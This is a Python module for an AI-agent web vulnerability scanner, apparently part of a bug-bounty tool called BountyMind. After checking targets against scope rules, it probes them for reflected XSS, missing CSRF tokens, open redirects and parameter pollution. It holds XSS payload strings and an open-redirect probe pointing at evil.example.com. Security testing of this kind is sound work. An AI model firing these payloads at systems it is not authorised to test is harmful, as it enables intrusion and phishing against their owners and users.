from __future__ import annotations

from .base_agent import BaseTeamAgent, AgentState, _utcnow
from ...core.models import AgentLoadOut
from ...tools.registry import ToolRegistry
from ...tools.scope_checker import validate_scope, ScopeViolationError
import httpx


class WebTester(BaseTeamAgent):
    agent_id    = "WebTester"
    model_alias = "MODEL_AGENT_STD"

    async def _execute_node(self, state: AgentState) -> dict:
        loadout   = AgentLoadOut(**state["loadout"])
        test_idx  = state.get("test_idx", 0)
        iteration = state.get("iteration", 0)
        scope_rules = state.get("scope_rules", {})

        if test_idx >= len(loadout.test_cases) or iteration >= loadout.max_iterations:
            return {"messages": [{"role": "system", "content": f"[WebTester] done", "agent": self.agent_id, "ts": _utcnow()}]}

        tc      = loadout.test_cases[test_idx]
        surface = tc.get("surface", "")

        try:
            validate_scope(surface, scope_rules)
        except ScopeViolationError:
            return {"test_idx": test_idx + 1, "iteration": iteration + 1,
                    "messages": [{"role": "system", "content": f"[WebTester] scope skip: {surface}", "agent": self.agent_id, "ts": _utcnow()}]}

        technique   = tc.get("technique", "")
        tool_config = loadout.tool_configs.get(technique, {})

        result = await self._run_web_technique(technique, surface, tool_config, tc, loadout, state)

        findings = list(state.get("local_findings", []))
        if result.get("confirmed") or result.get("output"):
            from .base_agent import _build_raw_finding
            findings.append(_build_raw_finding(tc, result, self.agent_id))

        should_collab = len(findings) > 0 and iteration > 0 and iteration % 3 == 0

        return {
            "local_findings": findings,
            "test_idx":       test_idx + 1,
            "iteration":      iteration + 1,
            "_should_collaborate": should_collab,
            "messages": [{"role": "system", "content": f"[WebTester] {technique} on {surface} → {'✓' if result.get('confirmed') else '·'}", "agent": self.agent_id, "ts": _utcnow()}],
        }

    async def _run_web_technique(
        self,
        technique: str,
        surface: str,
        config: dict,
        tc: dict,
        loadout: "AgentLoadOut",
        state: "AgentState",
    ) -> dict:
        try:
            tool_fn = ToolRegistry.get(technique)
            return await tool_fn(target=surface, **config)
        except KeyError:
            pass

        if technique in ("xss_reflected", "xss"):
            return await self._test_xss(surface, config)
        if technique in ("csrf", "csrf_check"):
            return await self._test_csrf(surface, config)
        if technique in ("open_redirect",):
            return await self._test_open_redirect(surface, config)
        if technique in ("parameter_pollution", "http_param_pollution"):
            return await self._test_param_pollution(surface, config)

        return await self._llm_execute(tc, loadout, state)

    async def _test_xss(self, url: str, config: dict) -> dict:
        payloads = [
            '<script>alert(1)</script>',
            '"><script>alert(1)</script>',
            "';alert(1)//",
            '<img src=x onerror=alert(1)>',
            '{{7*7}}',
            '${7*7}',
        ]
        try:
            async with httpx.AsyncClient(timeout=8, verify=False, follow_redirects=True) as client:
                for payload in payloads[:3]:
                    params = {config.get("field", "q"): payload}
                    resp = await client.get(url, params=params,
                                            headers={"User-Agent": "Mozilla/5.0 BountyMind/4.0"})
                    if payload in resp.text:
                        return {
                            "confirmed":  True,
                            "payload":    payload,
                            "output":     f"XSS payload reflected in response: {payload}",
                            "request":    {"url": url, "params": params},
                            "response_diff": {"reflected": payload},
                            "description": f"Reflected XSS at {url} via parameter {config.get('field', 'q')}",
                            "reproduction_steps": [
                                f"1. Navigate to {url}",
                                f"2. Set parameter {config.get('field','q')}={payload}",
                                "3. Observe payload reflected in HTML response without encoding",
                            ],
                        }
        except Exception:
            pass
        return {"confirmed": False, "output": ""}

    async def _test_csrf(self, url: str, config: dict) -> dict:
        try:
            async with httpx.AsyncClient(timeout=8, verify=False, follow_redirects=True) as client:
                resp = await client.get(url, headers={"User-Agent": "Mozilla/5.0 BountyMind/4.0"})
                import re
                html = resp.text
                has_csrf_token = bool(re.search(
                    r'(?:csrf|_token|authenticity_token|__RequestVerificationToken)',
                    html, re.I
                ))
                has_form = bool(re.search(r'<form', html, re.I))
                if has_form and not has_csrf_token:
                    return {
                        "confirmed":   True,
                        "output":      f"Form at {url} lacks CSRF token",
                        "description": f"CSRF vulnerability: form at {url} has no anti-CSRF token",
                        "request":     {"url": url, "method": "GET"},
                        "response_diff": {"missing": "csrf_token"},
                        "payload":     "",
                        "reproduction_steps": [
                            f"1. Observe form at {url}",
                            "2. Note absence of CSRF token in form fields",
                            "3. Craft cross-origin POST request",
                            "4. Submit from attacker-controlled origin",
                        ],
                    }
        except Exception:
            pass
        return {"confirmed": False, "output": ""}

    async def _test_open_redirect(self, url: str, config: dict) -> dict:
        redirect_params = ["redirect", "return", "next", "url", "goto", "redir", "redirect_uri", "redirect_url"]
        evil_url = "https://evil.example.com"
        try:
            async with httpx.AsyncClient(timeout=8, verify=False, follow_redirects=False) as client:
                for param in redirect_params:
                    test_url = f"{url}?{param}={evil_url}"
                    resp = await client.get(test_url, headers={"User-Agent": "Mozilla/5.0 BountyMind/4.0"})
                    if resp.status_code in (301, 302, 303, 307, 308):
                        location = resp.headers.get("location", "")
                        if "evil.example.com" in location:
                            return {
                                "confirmed":   True,
                                "payload":     evil_url,
                                "output":      f"Open redirect via parameter '{param}' → {location}",
                                "description": f"Open redirect at {url} via parameter '{param}'",
                                "request":     {"url": test_url},
                                "response_diff": {"location": location},
                                "reproduction_steps": [
                                    f"1. Navigate to {test_url}",
                                    f"2. Observe redirect to {location}",
                                    "3. Attacker can redirect victims to phishing sites",
                                ],
                            }
        except Exception:
            pass
        return {"confirmed": False, "output": ""}

    async def _test_param_pollution(self, url: str, config: dict) -> dict:
        try:
            async with httpx.AsyncClient(timeout=8, verify=False, follow_redirects=True) as client:
                param = config.get("field", "id")
                resp1 = await client.get(f"{url}?{param}=1",
                                         headers={"User-Agent": "Mozilla/5.0 BountyMind/4.0"})
                resp2 = await client.get(f"{url}?{param}=1&{param}=2",
                                         headers={"User-Agent": "Mozilla/5.0 BountyMind/4.0"})
                if resp1.status_code != resp2.status_code or resp1.text[:200] != resp2.text[:200]:
                    return {
                        "confirmed":   True,
                        "output":      f"HTTP Parameter Pollution detected at {url} via {param}",
                        "description": f"Duplicate parameter '{param}' causes different behavior",
                        "request":     {"url": url, "params": f"{param}=1&{param}=2"},
                        "response_diff": {"status_change": resp1.status_code != resp2.status_code},
                        "payload":     f"{param}=1&{param}=2",
                        "reproduction_steps": [
                            f"1. Send {url}?{param}=1",
                            f"2. Send {url}?{param}=1&{param}=2",
                            "3. Compare responses",
                        ],
                    }
        except Exception:
            pass
        return {"confirmed": False, "output": ""}
